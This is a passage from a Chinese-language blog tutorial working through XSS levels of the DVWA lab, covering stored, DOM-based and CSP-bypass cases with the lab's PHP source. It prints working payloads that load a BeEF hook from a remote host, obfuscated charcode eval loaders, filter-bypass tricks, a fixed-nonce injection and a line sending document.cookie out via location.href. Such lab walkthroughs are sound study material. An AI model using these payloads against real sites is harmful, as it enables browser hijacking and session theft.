mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>str_replace</code> 可以通过双写或者大写等绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scrip&lt;script&gt;t&gt;<span class="attr">http</span>:<span class="comment">//192.168.152.128:3000/hook.js&lt;/scrip&lt;script&gt;t&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>限制了输入长度，将其改为 200。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927172843131.png"
                      alt="image-20230927172843131"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173103574.png"
                      alt="image-20230927173103574"
                ></p>
<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173151375.png"
                      alt="image-20230927173151375"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>和 xss-r 的 High 难度一样，通过编码绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>修改 Message 可输入长度。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173609007.png"
                      alt="image-20230927173609007"
                ></p>
<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173705996.png"
                      alt="image-20230927173705996"
                ></p>
<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>DOM 型 XSS 可以在前端通过 js 渲染来完成数据的交互，达到插入数据造成 XSS 脚本攻击。因 ‘#’ 后面的内容不会发送到服务器上，所以即使抓包无无法抓取到这里的流量，也不会经过服务器过滤器阻止。而反射性与存储型 XSS 需要与服务器交互，这便是三者的区别。</p>
<p><a class="link"   href="https://blog.csdn.net/qq_53577336/article/details/122441536" >DOM参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h5 id="dvwa-例题-2"><a href="#dvwa-例题-2" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># No protections, anything goes</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>select 任意一种语言后</p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927184520953.png"
                      alt="image-20230927184520953"
                ></p>
<p>更改 default 参数。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> 成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927185920467.png"
                      alt="image-20230927185920467"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line">	$default = $_GET[&#x27;default&#x27;];</span><br><span class="line"></span><br><span class="line">	# Do not allow script tags</span><br><span class="line">	if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">		header (&quot;location: ?default=English&quot;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>不允许 <code>&lt;script</code> 执行，更换闭合方式即可。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/option&gt;&lt;/</span>select&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927192547528.png"
                      alt="image-20230927192547528"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	# White list the allowable languages</span><br><span class="line">	switch ($_GET[&#x27;default&#x27;]) &#123;</span><br><span class="line">		case &quot;French&quot;:</span><br><span class="line">		case &quot;English&quot;:</span><br><span class="line">		case &quot;German&quot;:</span><br><span class="line">		case &quot;Spanish&quot;:</span><br><span class="line">			# ok</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			header (&quot;location: ?default=English&quot;);</span><br><span class="line">			exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>服务端的白名单，可用 # 绕过，# 后的 js 将在本地解析，而不会上传至服务器，并且这个脚本对以上通用。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?default=English#&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927193324140.png"
                      alt="image-20230927193324140"
                ></p>
<h2 id="XSS进阶"><a href="#XSS进阶" class="headerlink" title="XSS进阶"></a>XSS进阶</h2><h3 id="CSP简述"><a href="#CSP简述" class="headerlink" title="CSP简述"></a>CSP简述</h3><p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，采取白名单制度，开发者告诉客户端，哪些外部资源可以加载和执行，哪些不可以。通过 <code>HTTP</code> 消息头或者 <code>HTML</code> 的 <code>Meta</code> 标签中设置。正常 <code>CSP</code> 有多组策略组成，每组策略包含一个策略指令和内容源列表。</p>
<ul>
<li><p>通过<code>HTTP</code>消息头设置：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; allowed.com; img-src &#x27;self&#x27; allowed.com; style-src &#x27;self&#x27;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通过<code>HTML</code> 的 <code>Meta</code> 标签中设置：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>CSP指令</strong></p>
<ul>
<li>script-src：外部脚本</li>
<li>style-src：样式表</li>
<li>img-src：图像</li>
<li>media-src：媒体文件（音频和视频）</li>
<li>font-src：字体文件</li>
<li>object-src：插件（比如 Flash）</li>
<li>child-src：框架</li>
<li>frame-ancestors：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>）</li>
<li>connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li>worker-src：worker脚本</li>
<li>manifest-src：manifest 文件</li>
<li>dedault-src：默认配置</li>
<li>frame-ancestors：限制嵌入框架的网页</li>
<li>base-uri：限制&lt;base#href&gt;</li>
<li>form-action：限制&lt;form#action&gt;</li>
<li>block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li>upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li>plugin-types：限制可以使用的插件格式</li>
<li>sandbox：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
<p><strong>CSP指令值</strong></p>
<ul>
<li>*： 星号表示允许任何URL资源，没有限制；</li>
<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>
<li>data：仅允许数据模式（如Base64编码的图片）方式加载资源；</li>
<li>none：不允许任何资源被加载；</li>
<li>unsafe-inline：允许使用内联资源，例如内联<code>&lt;script&gt;</code>标签，内联事件处理器，内联<code>&lt;style&gt;</code>标签等，但出于安全考虑，不建议使用；</li>
<li>nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；</li>
</ul>
<h3 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a><a class="link"   href="https://zhuanlan.zhihu.com/p/368865224" >CSP绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><h4 id="location-href绕过"><a href="#location-href绕过" class="headerlink" title="location.href绕过"></a>location.href绕过</h4><p>很多网站常常不得已需要执行内联，CSP不影响location.href跳转。我们可以借此执行 <code>JavaScript</code>，也可以利用 <code>loction</code>跳转外带数据。</p>
<p><strong>location-herf.php</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class="line">    &#125;//</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165318034.png"
                      alt="image-20231007165318034"
                ></p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">?a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://127.0.0.1&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165343194.png"
                      alt="image-20231007165343194"
                ></p>
<h4 id="dvwa-例题-3"><a href="#dvwa-例题-3" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h4><h5 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># These might work if you can&#x27;t create your own for some reason</span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 白名单</span><br><span class="line">https://pastebin.com</span><br><span class="line">hastebin.com</span><br><span class="line">example.com</span><br><span class="line">code.jquery.com</span><br><span class="line">https://ssl.google-analytics.com</span><br></pre></td></tr></table></figure></div>

<p>headerCSP 放置了一些 url，使用 script src 指令 指向一个外部 JavaScript 文件，header() 函数以原始形式将 HTTP 标头发送到客户端或浏览器，源码对 HTTP 头定义了 CSP 标签，从而定义了可以接受外部 JavaScript 资源的白名单。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111416286.png"
                      alt="image-20231011111416286"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111726446.png"
                      alt="image-20231011111726446"
                ></p>
<p>首先在白名单网站<code>https://pastebin.com/</code>里边创建一个 <code>JavaScript</code> 代码<code>alert(&quot;XSS&quot;)</code>保存记住链接<code>eg: https://pastebin.com/raw/Qp0pTUvF</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111850527.png"
                      alt="image-20231011111850527"
                ></p>
<p>输入后，点击<code>include</code>。因为网站在是国外的，访问较慢，可能不会出现弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112448886.png"
                      alt="image-20231011112448886"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112509622.png"
                      alt="image-20231011112509622"
                > </p>
<p>抓包看一下，请求已经发送出去了。</p>
<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">// Disable XSS protections so that inline alert boxes will work</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><code>CSP</code> 策略尝试使用 <code>nonce</code> 来防止攻击者添加内联脚本。<code>HTTP</code> 头信息中的 <code>script-src</code> 的合法来源发生了变化。<code>script-src</code> 还可以设置一些特殊值，<code>unsafe-inline</code> 允许执行页面内嵌的 <code>&lt;script&gt;</code>标签和事件监听函数，<code>nonce</code> 值会在每次 <code>HTTP</code> 回应给出一个授权 <code>token</code>。</p>
<ul>
<li>Attack</li>
</ul>
<p><code>payload</code>:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script nonce=<span class="string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span>&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114921730.png"
                      alt="image-20231011114921730"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114940467.png"
                      alt="image-20231011114940467"
                ></p>
<p>直接通过内联 <code>JavaScript</code> 代码，注入时直接令 <code>nonce</code> 为设定好的值即可。</p>
<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// high.php</span><br><span class="line">&lt;?php</span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>源代码的 <code>CSP:</code> <code>&quot;Content-Security-Policy: script-src ‘self’;&quot;</code> 意思是只能从本页面调用 <code>javascript</code> 脚本。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// high.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">solveSum</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;answer&quot;</span>).<span class="property">innerHTML</span> = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="variable language_">document</span>.<span class="property">getElementById</span> (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">clickButton</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>点击网页的按钮使 <code>js</code> 生成一个 <code>script</code> 标签，<code>src</code> 指向 <code>source/jsonp.php?callback=solveNum</code>。<code>appendChild()</code> 方法把 <code>“source/jsonp.php?callback=solveNum”</code> 加入到 DOM 中。 <code>solveNum()</code> 函数传入参数 <code>obj</code>，如果字符串 <code>“answer”</code>  在 <code>obj</code> 中就会执行。<code>getElementById()</code> 方法可返回对拥有指定 <code>ID</code> 的第一个对象的引用，<code>innerHTML</code> 属性设置或返回表格行的开始和结束标签之间的 <code>HTML</code>。这里的 <code>script</code> 标签会把远程加载的 <code>solveSum(&#123;&quot;answer&quot;:&quot;15&quot;&#125;)</code> 当作 <code>js</code> 代码执行， 然后这个函数就会在页面显示答案。</p>
